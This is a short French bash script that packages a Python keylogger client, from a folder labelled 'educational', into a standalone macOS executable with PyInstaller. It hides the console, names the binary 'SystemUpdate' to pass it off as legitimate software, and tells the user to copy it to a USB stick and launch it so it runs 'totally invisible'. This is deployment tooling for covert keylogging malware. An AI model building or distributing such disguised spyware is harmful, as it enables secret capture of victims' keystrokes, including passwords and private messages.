#!/bin/bash
# Créer un exécutable standalone avec PyInstaller

echo "🔧 Création d'un exécutable standalone..."

# Installer PyInstaller si nécessaire
if [ ! -d "../venv" ]; then
    echo "❌ Venv manquant. Lance depuis /tmp/keylogger_educatif/"
    exit 1
fi

cd ..
source venv/bin/activate
pip install pyinstaller

echo "📦 Packaging en exécutable..."

# Créer l'exécutable
pyinstaller --onefile \
    --noconsole \
    --hidden-import=pynput.keyboard._darwin \
    --hidden-import=pynput.mouse._darwin \
    --name="SystemUpdate" \
    --add-data "keylogger_client.py:." \
    keylogger_client.py

echo ""
echo "✅ Exécutable créé: dist/SystemUpdate"
echo ""
echo "📋 Pour l'utiliser:"
echo "   1. Copie 'dist/SystemUpdate' sur ta clé USB"
echo "   2. Double-clic pour lancer"
echo "   3. Totalement invisible (pas de console, pas d'icône)"
echo ""
